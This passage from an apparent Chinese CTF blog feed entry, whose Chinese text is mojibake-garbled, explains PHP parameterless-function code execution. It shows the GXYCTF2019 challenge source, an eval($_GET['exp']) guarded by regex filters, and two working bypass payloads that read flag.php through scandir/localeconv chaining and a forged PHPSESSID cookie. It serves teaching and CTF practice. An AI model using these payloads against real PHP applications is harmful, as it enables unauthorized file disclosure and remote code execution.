ï¼šå‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚</li><li><strong>scandir()</strong> ï¼šå‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</li><li><strong>dirname()</strong> ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</li><li><strong>chdir()</strong> ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚</li></ul><p>æ•°ç»„ç›¸å…³çš„æ“ä½œï¼š</p><ul><li><a href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> ï¼š è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨</li></ul><h4 id="æ —å­"><a href="#æ —å­" class="headerlink" title="æ —å­"></a>æ —å­</h4><h5 id="GXYCTF2019â€”ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019â€”ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="GXYCTF2019â€”ç¦æ­¢å¥—å¨ƒ"></a>GXYCTF2019â€”ç¦æ­¢å¥—å¨ƒ</h5><p>æ‰«æç›®å½•<code>.git</code>æºç æ³„éœ²ï¼Œ<code>Githack</code>å¾—åˆ°<code>index</code>æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// echo $_GET['exp'];</span>                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token delimiter important">?></span></span></code></pre><p>payload1ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>payload2ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span>flag<span class="token operator">.</span>php</code></pre><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ul><li><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></li><li><a href="http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html">http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html</a></li><li><a href="https://www.gem-love.com/ctf/530.html?replytocom=5">https://www.gem-love.com/ctf/530.html?replytocom=5</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è†œè†œè†œè†œè†œè†œï¼ˆè¿™ä¸œè¥¿çœŸçš„æ˜¯å¥‡æ·«æŠ€å·§ï¼‰&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åˆ©ç”¨æ¡ä»¶&lt;/strong&gt;ï¼š&lt;code&gt;eval($_GET[&amp;#39;exp&amp;#39;]);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;é™åˆ¶æ¡ä»¶&lt;/strong&gt;ï¼š&lt;code&gt;preg_replace(&amp;#39;/[^\W]+\((?R)?\)/&amp;#39;, &amp;#39;&amp;#39;, $exp)&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="å¤‡å¿˜å½•" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="CTFé¢˜" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
</feed>
